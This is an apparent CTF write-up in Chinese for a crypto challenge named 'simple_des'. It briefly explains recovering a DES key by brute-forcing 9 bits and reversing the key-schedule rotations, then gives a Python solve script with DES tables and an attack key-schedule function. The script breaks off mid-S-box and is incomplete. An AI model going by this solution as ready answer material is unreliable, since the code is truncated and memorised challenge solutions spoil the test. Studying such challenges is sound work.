<h2 id="simple-des"><a href="#simple-des" class="headerlink" title="simple_des"></a>simple_des</h2><p>爆破9位恢复L，之后逆推下面这个操作即可恢复L，R的初始，由于LR来自key其中的56位，所以只要知道key的56个bit即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ROTATIONS[i]):</span><br><span class="line">        L.append(L.pop(<span class="number">0</span>))</span><br><span class="line">        R.append(R.pop(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> add</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">_IP = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">       <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">       <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>,</span><br><span class="line">       <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>,</span><br><span class="line">       <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>,</span><br><span class="line">       <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">       <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">       <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span></span><br><span class="line">       ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IP</span>(<span class="params">plain: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> [plain[x] <span class="keyword">for</span> x <span class="keyword">in</span> _IP]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__pc1 = [<span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">         <span class="number">0</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,</span><br><span class="line">         <span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>,</span><br><span class="line">         <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>,</span><br><span class="line">         <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>,</span><br><span class="line">         <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>,</span><br><span class="line">         <span class="number">13</span>, <span class="number">5</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>,</span><br><span class="line">         <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span></span><br><span class="line">         ]</span><br><span class="line"></span><br><span class="line">__pc2 = [</span><br><span class="line">    <span class="number">13</span>, <span class="number">16</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">4</span>,</span><br><span class="line">    <span class="number">2</span>, <span class="number">27</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">20</span>, <span class="number">9</span>,</span><br><span class="line">    <span class="number">22</span>, <span class="number">18</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">25</span>, <span class="number">7</span>,</span><br><span class="line">    <span class="number">15</span>, <span class="number">6</span>, <span class="number">26</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">1</span>,</span><br><span class="line">    <span class="number">40</span>, <span class="number">51</span>, <span class="number">30</span>, <span class="number">36</span>, <span class="number">46</span>, <span class="number">54</span>,</span><br><span class="line">    <span class="number">29</span>, <span class="number">39</span>, <span class="number">50</span>, <span class="number">44</span>, <span class="number">32</span>, <span class="number">47</span>,</span><br><span class="line">    <span class="number">43</span>, <span class="number">48</span>, <span class="number">38</span>, <span class="number">55</span>, <span class="number">33</span>, <span class="number">52</span>,</span><br><span class="line">    <span class="number">45</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">35</span>, <span class="number">28</span>, <span class="number">31</span></span><br><span class="line">]</span><br><span class="line">ROTATIONS = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PC_1</span>(<span class="params">key: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> [key[x] <span class="keyword">for</span> x <span class="keyword">in</span> __pc1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PC_2</span>(<span class="params">key: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> [key[x] <span class="keyword">for</span> x <span class="keyword">in</span> __pc2]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sub_key</span>(<span class="params">key: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">    key = PC_1(key)</span><br><span class="line">    L, R = key[:<span class="number">28</span>], key[<span class="number">28</span>:]</span><br><span class="line"></span><br><span class="line">    sub_keys = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ROTATIONS[i]):</span><br><span class="line">            L.append(L.pop(<span class="number">0</span>))</span><br><span class="line">            R.append(R.pop(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">        combined = L + R</span><br><span class="line">        sub_key = PC_2(combined)</span><br><span class="line">        sub_keys.append(sub_key)</span><br><span class="line">    <span class="comment"># print(&#x27;LL=&#x27;, L[:19])</span></span><br><span class="line">    <span class="comment"># print(&#x27;Rr=&#x27;, R)</span></span><br><span class="line">    <span class="keyword">return</span> sub_keys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sub_key_attack</span>(<span class="params">key: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">    L, R = key[:<span class="number">28</span>], key[<span class="number">28</span>:]</span><br><span class="line"></span><br><span class="line">    sub_keys = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(ROTATIONS[i]):</span><br><span class="line">            L.append(L.pop(<span class="number">0</span>))</span><br><span class="line">            R.append(R.pop(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">        combined = L + R</span><br><span class="line">        sub_key = PC_2(combined)</span><br><span class="line">        sub_keys.append(sub_key)</span><br><span class="line">    <span class="comment"># print(&#x27;LL=&#x27;, L[:19])</span></span><br><span class="line">    <span class="comment"># print(&#x27;Rr=&#x27;, R)</span></span><br><span class="line">    <span class="keyword">return</span> sub_keys</span><br><span class="line"></span><br><span class="line">__ep = [<span class="number">31</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>,</span><br><span class="line">        <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">        <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>,</span><br><span class="line">        <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>,</span><br><span class="line">        <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>,</span><br><span class="line">        <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">0</span></span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">__p = [<span class="number">15</span>, <span class="number">6</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">28</span>, <span class="number">11</span>, <span class="number">27</span>, <span class="number">16</span>,</span><br><span class="line">       <span class="number">0</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">4</span>, <span class="number">17</span>, <span class="number">30</span>, <span class="number">9</span>,</span><br><span class="line">       <span class="number">1</span>, <span class="number">7</span>, <span class="number">23</span>, <span class="number">13</span>, <span class="number">31</span>, <span class="number">26</span>, <span class="number">2</span>, <span class="number">8</span>,</span><br><span class="line">       <span class="number">18</span>, <span class="number">12</span>, <span class="number">29</span>, <span class="number">5</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">24</span></span><br><span class="line">       ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">EP</span>(<span class="params">data: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> [data[x] <span class="keyword">for</span> x <span class="keyword">in</span> __ep]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">P</span>(<span class="params">data: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="keyword">return</span> [data[x] <span class="keyword">for</span> x <span class="keyword">in</span> __p]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__s_box = [</span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>]</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>],</span><br><span class="line">        [<span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>]</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>]</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line">        [<span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>],</span><br><span class="line">        [<span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>]</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line">        [<span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>],</span><br><span class="line">        [<span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>]</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>],</span><br><span class="line">        [<span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span 